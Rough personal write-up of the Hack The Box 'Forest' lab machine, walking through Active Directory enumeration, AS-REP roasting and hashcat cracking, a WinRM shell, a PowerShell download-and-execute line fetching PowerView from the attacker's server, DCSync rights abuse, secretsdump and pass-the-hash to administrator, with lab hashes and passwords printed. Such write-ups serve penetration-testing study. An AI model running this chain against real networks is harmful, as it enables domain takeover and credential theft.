# Forest

## Preparation

Added IP in /etc/hosts as forest.htb

## Recon

Starting with nmap.
	Pulled Hostname and Host Version from SMB
		forest.htb.local
		Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)

### SMB

Siging Required
Anon Login, No shares
Passwords must be at least seven characters
```
crackmapexec smb forest.htb --pass-pol -u '' -p ''
```
### DNS

Zone transfer does not work

### LDAP
used ldapsearch
```
ldapsearch -h forest.htb
	Using MD5 auth
ldapsearch -h forest.htb -x
	anonymous login
ldapsearch -h forest.htb -x -b base namingcontexts
	pull domain component (dc)
ldapsearch -h forest.htb -x -b "DC=htb,DC=local"
	pull dc info
ldapsearch -h forest.htb -x -b "DC=htb,DC=local" '(objectClass=Person)'
	only pull people stuff
ldapsearch -h forest.htb -x -b "DC=htb,DC=local" '(objectClass=User)'
	only pull user stuff (only difference is dSCorePropagationData)
```

### NetBIOS-NS

### Kerberos

### RPC

```
for i in $(cat ~/ctfs/htb/forest/users.txt); do ./GetNPUsers.py -dc-ip forest.htb -request -format hashcat "htb.local/$i"; done;
```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:1244770f69ae86ad76bc6198c97852ad$4ab177d23a7ca6a4e284b9515449acfb54471e8b73cc10d1a616ecff252192940ccb7e1a31003c01e0dcc2be0808204c379d9cf5df74ba2d15e693f1e29f2fbd236b5c9ae803308872223f9eaca93e2278e0c0f6793038c14f5407e4b3cd99048b6e862c6c61604220367f440a9feaf8805f6be639dd6c352b2c2372c2b7a445828a25e71ea46624488ed5b77c4cb7a174baedca2332fdb374a7559712a6fd74d49d78d6aaab6b619804878b5ea4fbf517b212b00dc54c212412847d078346b394bdd22a42a6c47fe4e6d66cb1d919a6d8650eb37f0d05d4bdf8c109a8edfaa0ed0b2d04407f

```
hashcat -a 0 -m 18200 --session forest-alfresco svc-alfresco.hash rockyou.txt
```	
s3rvice

smb:svc-alfresco:s3rvice

5985/tcp open  wsman
Trying Evil-WinRM
Got user!
```
evil-winrm -i forest.htb -u svc-alfresco -p s3rvice
```

Enumerated users from ldap and smb
	sebastien
	lucinda
	andy
	mark
	santi'
	svc-alfresco

Used impacket to get users who have Kerberos Pre-Auth disabled (Pre-Auth prevents bruteforing by requiring the sender to encrypt the timestamp with the users password hash, we do not know the users password and it would be cumbersome to brutforece in that way). Found svc-alfresco had Pre-Auth disabled (so we were able to query the Key Distrubution Center [KDC] and return a TGT encrypted with the users password)
```	
for i in $(cat ~/ctfs/htb/forest/users.txt); do ./GetNPUsers.py -dc-ip forest.htb -request -format hashcat "htb.local/$i"; done;
```
## Cracking the Perimeter

Used hashcat to crack the password (note: used hashcat --example-hashes to get mode 18200)
```
hashcat -a 0 -m 18200 --session forest-alfresco svc-alfresco.hash rockyou.txt
```

Tried to get a shell with cme, no dice, not admin
```
crackmapexec smb forest.htb -u svc-alfresco -p s3rvice
```

Checking for Win-RM
```
nmap -p 5985 forest.htb
```

It's open. Getting a shell.
```
evil-winrm -i forest.htb -u svc-alfresco -p s3rvice
```

## Privelege Escalation

Downloading PowerView from my Python web server
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.18/PowerView.ps1')
```

Storing new credentials as variables
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-SecureString 'montysecurity' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('HTB\monty', $SecPassword)
```

Giving myself DCSync rights, which allows us to mimic a DC and request passwords
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity monty -Rights DCSync
```

Login as new user and dump hashes
```
./secretsdump.py htb.local/monty:montysecurity@10.10.10.161
```

Pass the Hash with PSExec to get admin
```
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@forest.htb
```